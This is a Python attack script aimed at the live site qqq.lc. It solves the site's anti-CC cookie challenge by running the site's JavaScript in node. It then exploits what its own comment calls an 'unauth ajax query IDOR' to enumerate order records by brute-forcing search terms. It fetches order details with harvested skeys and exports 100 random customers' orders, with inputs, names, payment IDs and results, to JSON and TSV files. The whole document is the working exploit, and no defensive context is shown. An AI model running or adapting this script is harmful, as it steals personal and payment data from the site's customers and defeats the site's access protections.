
import re,subprocess,json,time,random
from pathlib import Path
HOST='qqq.lc';BASE=f'https://{HOST}'
UA='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36'
OUT=Path('/tmp/qqqlc_export100'); OUT.mkdir(exist_ok=True)

class Jar:
    def __init__(self): self.c={}
    def header(self): return '; '.join(f'{k}={v}' for k,v in self.c.items())
    def absorb(self, hdr_text):
        for line in hdr_text.splitlines():
            if line.lower().startswith('set-cookie:'):
                part=line.split(':',1)[1].strip().split(';')[0]
                if '=' in part:
                    k,v=part.split('=',1); self.c[k.strip()]=v.strip()
jar=Jar()

def curl(path, method='GET', data=None, headers=None, t=40):
    cmd=['curl','-sk','-D','-','--max-time',str(t),'-A',UA,'-H',f'Referer: {BASE}/','--max-redirs','0']
    if jar.c: cmd+=['-H',f'Cookie: {jar.header()}']
    if headers:
        for k,v in headers.items(): cmd+=['-H',f'{k}: {v}']
    url=path if path.startswith('http') else BASE+path
    if method=='POST':
        cmd+=['-X','POST','-H','Content-Type: application/x-www-form-urlencoded','--data-binary',data or '']
    cmd.append(url)
    p=subprocess.run(cmd,capture_output=True,timeout=t+15)
    text=(p.stdout or b'').decode('utf-8','replace')
    hdr,body=(text.split('\r\n\r\n',1)+[''])[:2] if '\r\n\r\n' in text else (text,'')
    jar.absorb(hdr)
    return body

def pass_cc():
    body=curl('/')
    m=re.search(r"setCookie\('ccsafe_defend',(.+?)\);",body)
    val=subprocess.check_output(['node','-e','console.log('+m.group(1)+')'],timeout=20).decode().strip()
    jar.c['ccsafe_defend']=val; jar.c['ccsafe_defend_time']='2'
    curl('/'); curl('/user/login.php')
    print('cc ok')

pass_cc()
xhr={'X-Requested-With':'XMLHttpRequest'}

# load hits if present
hits={}
try:
    hits=json.load(open('/tmp/qqqlc_enum_totals.json'))['hits']
except Exception:
    pass
if not hits:
    for q in ['广东','1','江西','云南','湖南','安徽','湖北','浙江','河南','山东','福建','四川','河北','上海','广西','北京','江苏','重庆','辽宁','2','3','9','qq']:
        j=json.loads(curl('/ajax.php?act=query',method='POST',data=f'querytype=1&qq={q}&page=1',headers=xhr))
        if j.get('total'): hits[q]=j['total']
        time.sleep(0.25)

# weighted sample of (input, page) pairs then fetch
random.seed()
pool=[]
# prefer diverse inputs
items=sorted(hits.items(), key=lambda x:-x[1])
# take top 40 inputs
items=items[:40]
for q,tot in items:
    pages=max(1,(tot+9)//10)
    # sample up to 8 random pages per input
    for p in random.sample(range(1,pages+1), k=min(8, pages)):
        pool.append((q,p))
random.shuffle(pool)

orders={}
for q,p in pool:
    if len(orders)>=140:
        break
    try:
        body=curl('/ajax.php?act=query',method='POST',data=f'querytype=1&qq={q}&page={p}',headers=xhr)
        j=json.loads(body)
    except Exception as e:
        print('err',q,p,e); time.sleep(1); continue
    data=j.get('data') or {}
    if not isinstance(data,dict):
        continue
    for o in data.values():
        if isinstance(o,dict) and o.get('id'):
            orders[o['id']]=o
    print(f'fetch {q!r} p={p} got={len(data)} uniq={len(orders)}')
    time.sleep(0.28)

ids=list(orders.keys())
random.shuffle(ids)
ids=ids[:100]
selected=[orders[i] for i in ids]

# enrich with order detail (compact)
enriched=[]
for i,o in enumerate(selected):
    row={
        'id': o.get('id'),
        'tid': o.get('tid'),
        'input': o.get('input'),
        'name': o.get('name'),
        'money': o.get('money'),
        'status': o.get('status'),
        'addtime': o.get('addtime'),
        'endtime': o.get('endtime'),
        'skey': o.get('skey'),
        'payorder': o.get('payorder'),
        'result': o.get('result'),
        'value': o.get('value'),
    }
    try:
        body=curl('/ajax.php?act=order',method='POST',data=f'id={o["id"]}&skey={o["skey"]}',headers=xhr)
        d=json.loads(body)
        row['detail']={
            'code': d.get('code'),
            'status': d.get('status'),
            'inputs': d.get('inputs'),
            'list': d.get('list'),
            'list_result': d.get('list_result'),
            'kminfo': d.get('kminfo'),
            'result': d.get('result'),
            'date': d.get('date'),
            'money': d.get('money'),
            'name': d.get('name'),
        }
    except Exception as e:
        row['detail_error']=str(e)
    enriched.append(row)
    if (i+1)%10==0:
        print('detail', i+1)
    time.sleep(0.25)

export={
    'target': 'https://qqq.lc/',
    'exported_at': time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime()),
    'count': len(enriched),
    'note': 'Random sample via unauth ajax query IDOR; SMS list/kminfo typically null',
    'orders': enriched,
}
(OUT/'qqqlc_random_100.json').write_text(json.dumps(export, ensure_ascii=False, indent=2))

# also CSV-ish TSV for easy view
lines=['id\tinput\tstatus\tmoney\taddtime\tname\tskey\tlist\tkminfo']
for r in enriched:
    d=r.get('detail') or {}
    lines.append('\t'.join(str(x).replace('\t',' ').replace('\n',' ') for x in [
        r.get('id'), r.get('input'), r.get('status'), r.get('money'), r.get('addtime'),
        r.get('name'), r.get('skey'), d.get('list'), d.get('kminfo')
    ]))
(OUT/'qqqlc_random_100.tsv').write_text('\n'.join(lines))
print('DONE', len(enriched), 'json', (OUT/'qqqlc_random_100.json').stat().st_size)
print('status_hist', {s: sum(1 for r in enriched if r.get('status')==s) for s in sorted(set(r.get('status') for r in enriched))})
print('inputs_sample', sorted({r.get('input') for r in enriched})[:20], 'n_unique_inputs', len({r.get('input') for r in enriched}))
